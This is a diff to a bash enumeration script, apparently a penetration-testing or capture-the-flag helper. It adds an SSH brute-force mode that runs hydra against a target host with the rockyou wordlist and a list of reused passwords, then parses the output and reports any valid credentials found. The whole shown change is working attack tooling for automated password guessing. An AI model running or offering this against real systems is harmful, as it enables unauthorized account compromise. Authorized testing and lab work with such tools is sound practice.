@@ -7,12 +7,13 @@
 
 
 ## Services, ports and functions
-tcp_services=("SSH Credentials" "SMB/Samba")
-tcp_port=("22" "139 445")
-tcp_enumeration=("ssh-creds" "samba")
+tcp_services=("SSH Known Credentials" "SSH Brute Force" "SMB/Samba")
+tcp_port=("22" "22" "139 445")
+tcp_enumeration=("ssh-known" "ssh-brute" "samba")
 
 found_users=/root/lists/users.txt
 found_passwords=/root/lists/pass-reuse.txt
+brute_passwords=/usr/share/wordlists/rockyou.txt
 
 red="$(tput setaf 1)"
 green="$(tput setaf 2)"
@@ -30,15 +31,33 @@ echo "==- ${green}Enumeration by ${red}ded_sn0${der} -=="
 #
 #########################################################################
 
-function ssh-creds {
+function ssh-known {
 	hydra_attack ssh $found_users $found_passwords
+}
+
+function ssh-brute {
+	hydra_attack ssh $found_users $brute_passwords
 }
 
 # generic hydra attack for credentials
 # $1 = protocol, $2 = users, $3 = passwords
 function hydra_attack {
-	echo "[*] Running hydra attack against $1 on $target with users:$2"
-	hydra -L $2 -P $3 $1://$target
+	echo "[*] Running hydra attack against $1 on $target with"
+	echo "[*]        users:$2 & passwords:$3"
+	report="$(hydra -L $2 -P $3 $1://$target 2>&1)"
+	if [ -n "$(echo "$report" |grep "not support password auth")" ]; then
+		echo "[*]  ${red}$1 does not support passwords - keys only${der}"
+	else 
+		n="$(echo "$report" |grep "valid passwords found" |cut -d" " -f6)"
+		if [ -z "$n" ]; then echo "[*] Error running hydra"
+		elif [ "$n" -eq "0" ]; then echo "{*} No valid $1 creds found"
+		else
+		echo "[*}  ${red}Found $n valid credentials for $1${der}"
+		fi
+	fi
+	echo "$report" > hydra-known-passwords.txt
+
+	
 }
 
 function samba {
